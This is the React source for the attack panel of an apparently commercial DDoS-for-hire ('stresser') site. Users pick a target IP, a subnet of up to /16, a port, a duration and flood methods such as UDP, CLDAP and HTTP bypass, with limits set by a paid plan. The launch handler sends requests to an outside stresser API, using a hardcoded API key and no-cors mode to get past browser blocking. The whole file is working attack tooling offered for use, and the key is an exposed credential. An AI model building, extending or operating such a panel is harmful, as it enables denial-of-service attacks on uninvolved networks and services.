import React, { useState, useEffect } from 'react';
import { Terminal, Send, Search, ShieldAlert, Cpu, Activity, Settings, Info, Zap, Square, Loader } from 'lucide-react';
import { Link } from 'react-router-dom';
import { supabase } from '../lib/supabaseClient';

export default function Panel() {
  const [layer, setLayer] = useState('L4');
  const [method, setMethod] = useState('');
  const [port, setPort] = useState(80);
  const [time, setTime] = useState(60);
  const [conns, setConns] = useState(1);
  const [target, setTarget] = useState('');
  const [subnet, setSubnet] = useState('/32 — Host (1)');
  const [isAttacking, setIsAttacking] = useState(false);
  const [activeTasks, setActiveTasks] = useState([]);
  
  const [activePlan, setActivePlan] = useState('None');
  const [loadingPlan, setLoadingPlan] = useState(true);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session?.user) {
        setActivePlan(session.user.user_metadata?.active_plan ?? 'None');
      }
      setLoadingPlan(false);
    });
  }, []);

  const getPlanLimits = (planName) => {
    const name = (planName || 'None').toUpperCase();
    if (name.includes('STARTER')) return { name: 'Starter #1', concurrents: 1, duration: 60 };
    if (name.includes('BASIC #1')) return { name: 'Basic #1', concurrents: 2, duration: 1200 };
    if (name.includes('BASIC #2')) return { name: 'Basic #2', concurrents: 3, duration: 1200 };
    if (name.includes('ADVANCED #1')) return { name: 'Advanced #1', concurrents: 5, duration: 1200 };
    if (name.includes('ADVANCED #2')) return { name: 'Advanced #2', concurrents: 8, duration: 800 };
    if (name.includes('PROFESSIONAL #1')) return { name: 'Professional #1', concurrents: 10, duration: 1200 };
    if (name.includes('PROFESSIONAL #2')) return { name: 'Professional #2', concurrents: 13, duration: 1500 };
    if (name.includes('BUSINESS #1')) return { name: 'Business #1', concurrents: 16, duration: 2200 };
    if (name.includes('BUSINESS #2')) return { name: 'Business #2', concurrents: 20, duration: 2500 };
    if (name.includes('ENTERPRISE')) return { name: 'Enterprise', concurrents: 40, duration: 2100 };
    return { name: 'None', concurrents: 0, duration: 0 };
  };

  const planLimits = getPlanLimits(activePlan);
  const maxConns = planLimits.concurrents;
  const maxDuration = planLimits.duration;
  const hasPlan = planLimits.name !== 'None';

  useEffect(() => {
    if (activeTasks.length > 0) {
      const timer = setInterval(() => {
        setActiveTasks(prevTasks => {
          return prevTasks
            .map(task => ({
              ...task,
              timeLeft: task.timeLeft - 1
            }))
            .filter(task => task.timeLeft > 0);
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [activeTasks.length]);

  const formatTimeLeft = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  const getLayerLabel = (task) => {
    const methodUpper = task.method.toUpperCase();
    let protocol = methodUpper;
    if (methodUpper.includes('UDP')) protocol = 'UDP';
    else if (methodUpper.includes('TCP')) protocol = 'TCP';
    return `${task.layer} • ${protocol}`;
  };

  const handleStopAttack = (id) => {
    setActiveTasks(prev => prev.filter(task => task.id !== id));
  };

  const handleLaunchAttack = async () => {
    if (!target || !method || !hasPlan) return;
    
    setIsAttacking(true);
    
    // Enforce limits
    const finalConns = Math.min(Number(conns) || 1, maxConns);
    const finalDuration = Math.min(Number(time) || 10, maxDuration);

    // Hit the L4 API if layer is L4
    if (layer === 'L4') {
      try {
        const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5"; 
        const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${method}&concurrent=${finalConns}`;
        
        // We use mode: 'no-cors' so the browser doesn't block the request if the API server lacks CORS headers
        await fetch(apiUrl, { mode: 'no-cors' }); 
      } catch (err) {
        console.error("API Hit Error:", err);
      }
    }

    // Simulate API delay for a realistic user experience
    setTimeout(() => {
      const pad = (num) => String(num).padStart(2, '0');
      const d = new Date();
      const formattedDate = `${pad(d.getMonth() + 1)}/${pad(d.getDate())}/${d.getFullYear()}, ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;

      const newTasks = [];
      for (let i = 0; i < finalConns; i++) {
        newTasks.push({
          id: `${Date.now()}-${i}-${Math.random()}`,
          target,
          method: method.toUpperCase(),
          port,
          time: finalDuration,
          timeLeft: finalDuration,
          conns: 1, // each simulated attack card shows x1
          layer,
          startedAt: formattedDate
        });
      }

      setActiveTasks(prev => [...newTasks, ...prev]);
      setIsAttacking(false);
    }, 800);
  };
  
  if (loadingPlan) {
    return (
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', width: '100%', minHeight: '300px' }}>
        <Loader className="animate-spin" size={24} color="var(--accent-color)" />
      </div>
    );
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '32px', maxWidth: '100%', width: '100%' }}>
      
      <div>
        <h1 className="h1" style={{ marginBottom: '4px' }}>Attack Panel</h1>
        <p className="text-secondary" style={{ fontSize: '0.875rem' }}>Configure and launch network stress tests.</p>
      </div>

      <div className="panel-container-grid">
        
        {/* Banner if no plan */}
        {!hasPlan && (
          <div style={{ 
            background: 'rgba(239, 68, 68, 0.1)', 
            border: '1px solid rgba(239, 68, 68, 0.2)', 
            borderRadius: '12px', 
            padding: '16px 20px', 
            display: 'flex', 
            alignItems: 'center', 
            gap: '12px',
            color: '#f87171',
            gridColumn: 'span 2'
          }}>
            <ShieldAlert size={24} />
            <div>
              <div style={{ fontWeight: 700, fontSize: '0.9rem', marginBottom: '2px', textTransform: 'uppercase' }}>No Active Plan</div>
              <div style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                You do not have an active subscription. Please visit the <Link to="/store" style={{ color: '#fff', textDecoration: 'underline', fontWeight: 600 }}>Store</Link> to purchase a plan before launching attacks.
              </div>
            </div>
          </div>
        )}

        {/* Left Column: Configuration */}
        <div className="panel" style={{ padding: '24px', opacity: hasPlan ? 1 : 0.6 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
            <Settings size={18} color="var(--text-secondary)" style={{ transform: 'rotate(0deg)' }} />
            <h2 style={{ fontSize: '0.875rem', fontWeight: 700, color: '#fff', letterSpacing: '0.05em', textTransform: 'uppercase', margin: 0 }}>Configuration</h2>
          </div>
          
          <div style={{ height: '1px', background: 'var(--border-color)', marginBottom: '24px' }}></div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
            {/* Layer Toggle */}
            <div>
              <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>ATTACK LAYER</label>
              <div className="toggle-group" style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '4px' }}>
                <button 
                  className={`toggle-btn ${layer === 'L4' ? 'active' : ''}`}
                  onClick={() => hasPlan && setLayer('L4')}
                  disabled={!hasPlan}
                  style={{ borderRadius: '6px', padding: '8px 12px', fontWeight: 600 }}
                >
                  LAYER 4 - UDP
                </button>
                <button 
                  className={`toggle-btn ${layer === 'L7' ? 'active' : ''}`}
                  onClick={() => hasPlan && setLayer('L7')}
                  disabled={!hasPlan}
                  style={{ borderRadius: '6px', padding: '8px 12px', fontWeight: 600 }}
                >
                  LAYER 7 - HTTP
                </button>
              </div>
            </div>

            {/* Target Input */}
            <div>
              <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>TARGET IP</label>
              <input 
                type="text" 
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                placeholder="20.204.231.11" 
                disabled={!hasPlan}
                style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px' }}
              />
            </div>

            {/* Subnet and Port Grid */}
            <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1fr', gap: '16px' }}>
              <div>
                <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>SUBNET</label>
                <select 
                  value={subnet} 
                  onChange={(e) => setSubnet(e.target.value)}
                  disabled={!hasPlan}
                  style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px', color: '#fff' }}
                >
                  <option value="/32 — Host (1)">/32 — Host (1)</option>
                  <option value="/24 — Subnet (256)">/24 — Subnet (256)</option>
                  <option value="/16 — Subnet (65536)">/16 — Subnet (65536)</option>
                </select>
              </div>
              <div>
                <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>PORT</label>
                <input 
                  type="number" 
                  value={port}
                  onChange={(e) => setPort(e.target.value)}
                  placeholder="80" 
                  className="mono"
                  disabled={!hasPlan}
                  style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px' }}
                />
              </div>
            </div>

            {/* Duration Input */}
            <div>
              <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>DURATION (MAX {maxDuration}s)</label>
              <input 
                type="number" 
                value={time}
                onChange={(e) => {
                  const val = Number(e.target.value);
                  setTime(val > maxDuration ? maxDuration : val);
                }}
                placeholder="60" 
                className="mono"
                disabled={!hasPlan}
                style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px' }}
              />
            </div>

            {/* Method Select */}
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '8px' }}>
                <label style={{ fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', margin: 0 }}>ATTACK METHOD</label>
                <Info size={12} color="var(--text-muted)" style={{ cursor: 'pointer' }} />
              </div>
              <select 
                value={method} 
                onChange={(e) => setMethod(e.target.value)}
                disabled={!hasPlan}
                style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px', color: '#fff' }}
              >
                <option value="" disabled>Select attack method...</option>
                {layer === 'L4' ? (
                  <>
                    <option value="UDP-RAND">UDP-RAND</option>
                    <option value="UDP-PPS">UDP-PPS</option>
                    <option value="UDP-TINY">UDP-TINY</option>
                    <option value="UDP-BIG">UDP-BIG</option>
                    <option value="CLDAP">CLDAP</option>
                    <option value="BGMI">BGMI</option>
                  </>
                ) : (
                  <>
                    <option value="bypass">Bypass</option>
                    <option value="h2">H2</option>
                  </>
                )}
              </select>
            </div>

            {/* Concurrents Input & Slider */}
            <div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                <label style={{ fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', margin: 0 }}>CONCURRENTS (MAX {maxConns})</label>
                <input 
                  type="number" 
                  min="1"
                  max={maxConns}
                  value={conns}
                  onChange={(e) => {
                    const val = e.target.value;
                    if (val === '') {
                      setConns('');
                    } else {
                      const num = parseInt(val, 10);
                      if (!isNaN(num)) {
                        setConns(Math.max(1, Math.min(maxConns, num)));
                      }
                    }
                  }}
                  placeholder="1"
                  className="mono"
                  disabled={!hasPlan}
                  style={{ 
                    background: '#000', 
                    border: '1px solid var(--border-color)', 
                    borderRadius: '6px', 
                    padding: '4px 8px', 
                    width: '60px',
                    textAlign: 'center',
                    fontSize: '0.8rem'
                  }}
                />
              </div>
              <input 
                type="range" 
                min="1" 
                max={maxConns || 1} 
                value={conns || 1}
                onChange={(e) => setConns(Number(e.target.value))}
                disabled={!hasPlan}
                style={{ height: '2px', background: '#333', marginTop: '8px', marginBottom: '4px' }}
              />
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                <span>1</span>
                <span>{maxConns}</span>
              </div>
            </div>

            <button 
              className="btn btn-primary" 
              style={{ 
                width: '100%', 
                padding: '12px', 
                borderRadius: '8px', 
                background: 'rgba(255, 255, 255, 0.05)',
                border: '1px solid rgba(255, 255, 255, 0.1)',
                color: '#fff',
                fontWeight: 600,
                opacity: (!target || !method || isAttacking || !hasPlan) ? 0.5 : 1,
                transition: 'all 0.2s',
                marginTop: '8px'
              }}
              onClick={handleLaunchAttack}
              disabled={!target || !method || isAttacking || !hasPlan}
            >
              <Send size={14} /> {isAttacking ? 'Launching...' : 'Launch Attack'}
            </button>
          </div>
        </div>

        {/* Right Column: Status & Info */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
          
          {/* Active Attacks Panel */}
          <div className="panel" style={{ padding: '24px', flex: 1, display: 'flex', flexDirection: 'column', gap: '20px' }}>
            
            {/* Header */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <div style={{ 
                  display: 'flex', 
                  alignItems: 'center', 
                  justifyContent: 'center', 
                  width: '40px', 
                  height: '40px', 
                  borderRadius: '50%', 
                  background: 'rgba(255, 255, 255, 0.05)', 
                  border: '1px solid rgba(255, 255, 255, 0.1)' 
                }}>
                  <Activity size={20} color="#fff" />
                </div>
                <div>
                  <h2 style={{ fontSize: '1rem', fontWeight: 600, color: '#fff', margin: 0 }}>Active Attacks</h2>
                  <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)' }}>
                    {activeTasks.length} concurrent
                  </span>
                </div>
              </div>
              <div style={{ 
                display: 'flex', 
                alignItems: 'center', 
                gap: '6px', 
                background: 'rgba(16, 185, 129, 0.05)', 
                border: '1px solid rgba(16, 185, 129, 0.2)', 
                padding: '4px 10px', 
                borderRadius: '12px',
                fontSize: '0.75rem',
                fontWeight: 600,
                color: '#10b981'
              }}>
                <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#10b981', display: 'inline-block' }}></span>
                LIVE
              </div>
            </div>

            {/* Filters */}
            <div style={{ display: 'flex', gap: '10px' }}>
              <select style={{ width: 'auto', padding: '4px 24px 4px 12px', fontSize: '0.75rem', background: '#000', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-secondary)' }}>
                <option>All Layers</option>
              </select>
              <select style={{ width: 'auto', padding: '4px 24px 4px 12px', fontSize: '0.75rem', background: '#000', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-secondary)' }}>
                <option>Sort by Time Left</option>
              </select>
            </div>

            {/* Cards List wrapper */}
            {activeTasks.length > 0 ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', overflowY: 'auto', maxHeight: '600px', paddingRight: '4px' }}>
                {activeTasks.map((task) => (
                  <div key={task.id} style={{ 
                    background: '#080808', 
                    border: '1px solid rgba(255, 255, 255, 0.06)', 
                    borderRadius: '8px', 
                    display: 'flex',
                    flexDirection: 'column'
                  }}>
                    {/* Card Header */}
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '16px 20px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '0.875rem', fontWeight: 600, color: '#fff' }}>
                        <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#fff', boxShadow: '0 0 8px 2px rgba(255, 255, 255, 0.8)', display: 'inline-block' }}></span>
                        {getLayerLabel(task)}
                      </div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                        <span style={{ 
                          background: 'rgba(255, 255, 255, 0.08)', 
                          color: '#fff', 
                          padding: '4px 10px', 
                          borderRadius: '20px', 
                          fontSize: '0.65rem', 
                          fontWeight: 700,
                          border: '1px solid rgba(255, 255, 255, 0.1)',
                          letterSpacing: '0.05em'
                        }}>
                          RUNNING
                        </span>
                        <span className="mono" style={{ color: '#fff', fontWeight: 700, fontSize: '0.95rem' }}>
                          {formatTimeLeft(task.timeLeft)}
                        </span>
                        {/* Stop Button */}
                        <button 
                          onClick={() => handleStopAttack(task.id)}
                          style={{ 
                            background: 'rgba(239, 68, 68, 0.1)', 
                            border: '1px solid rgba(239, 68, 68, 0.2)', 
                            borderRadius: '6px', 
                            padding: '6px', 
                            display: 'flex', 
                            alignItems: 'center', 
                            justifyContent: 'center', 
                            cursor: 'pointer',
                            color: '#f87171',
                            transition: 'all 0.2s',
                            marginLeft: '4px'
                          }}
                          title="Stop Attack"
                          onMouseEnter={(e) => {
                            e.currentTarget.style.background = 'rgba(239, 68, 68, 0.2)';
                            e.currentTarget.style.color = '#ef4444';
                          }}
                          onMouseLeave={(e) => {
                            e.currentTarget.style.background = 'rgba(239, 68, 68, 0.1)';
                            e.currentTarget.style.color = '#f87171';
                          }}
                        >
                          <Square size={10} fill="#f87171" style={{ strokeWidth: 0 }} />
                        </button>
                      </div>
                    </div>

                    {/* Separator Line */}
                    <div style={{ height: '1px', background: 'rgba(255, 255, 255, 0.06)' }}></div>

                    {/* Card Content Grid */}
                    <div className="panel-card-content-grid">
                      {/* Column 1 */}
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                        <div>
                          <div style={{ fontSize: '0.65rem', color: '#666', marginBottom: '4px', fontWeight: 600, letterSpacing: '0.05em' }}>TARGET</div>
                          <div className="mono" style={{ fontSize: '0.875rem', color: '#fff', fontWeight: 700, wordBreak: 'break-all' }}>
                            {task.target}{task.port ? `:${task.port}` : ''}
                          </div>
                        </div>
                        <div>
                          <div style={{ fontSize: '0.65rem', color: '#666', marginBottom: '4px', fontWeight: 600, letterSpacing: '0.05em' }}>PROXY TYPE</div>
                          <div style={{ fontSize: '0.875rem', color: '#fff', fontWeight: 700 }}>Global</div>
                        </div>
                      </div>

                      {/* Column 2 */}
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                        <div>
                          <div style={{ fontSize: '0.65rem', color: '#666', marginBottom: '4px', fontWeight: 600, letterSpacing: '0.05em' }}>METHOD</div>
                          <div className="mono" style={{ fontSize: '0.875rem', color: '#fff', fontWeight: 700 }}>
                            {task.method}
                          </div>
                        </div>
                        <div>
                          <div style={{ fontSize: '0.65rem', color: '#666', marginBottom: '4px', fontWeight: 600, letterSpacing: '0.05em' }}>TIME LEFT</div>
                          <div className="mono" style={{ fontSize: '0.875rem', color: '#fff', fontWeight: 700 }}>
                            {formatTimeLeft(task.timeLeft)}
                          </div>
                        </div>
                      </div>

                      {/* Column 3 */}
                      <div>
                        <div style={{ fontSize: '0.65rem', color: '#666', marginBottom: '4px', fontWeight: 600, letterSpacing: '0.05em' }}>CONC</div>
                        <div className="mono" style={{ fontSize: '0.875rem', color: '#fff', fontWeight: 700 }}>
                          x{task.conns}
                        </div>
                      </div>

                      {/* Column 4 */}
                      <div>
                        <div style={{ fontSize: '0.65rem', color: '#666', marginBottom: '4px', fontWeight: 600, letterSpacing: '0.05em' }}>SENT AT</div>
                        <div style={{ fontSize: '0.8rem', color: '#fff', fontWeight: 700, wordBreak: 'break-word' }}>
                          {task.startedAt}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, minHeight: '240px', textAlign: 'center' }}>
                 <div style={{ 
                   width: '48px', 
                   height: '48px', 
                   borderRadius: '8px', 
                   background: '#000000', 
                   border: '1px solid var(--border-color)', 
                   display: 'flex', 
                   alignItems: 'center', 
                   justifyContent: 'center',
                   marginBottom: '16px'
                 }}>
                   <Zap size={20} color="var(--text-muted)" />
                 </div>
                 <h3 style={{ fontSize: '0.95rem', fontWeight: 600, color: '#fff', marginBottom: '6px' }}>No Active Attacks</h3>
                 <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>Launch an attack to see real-time statistics</p>
              </div>
            )}
          </div>
        </div>

      </div>
    </div>
  );
}
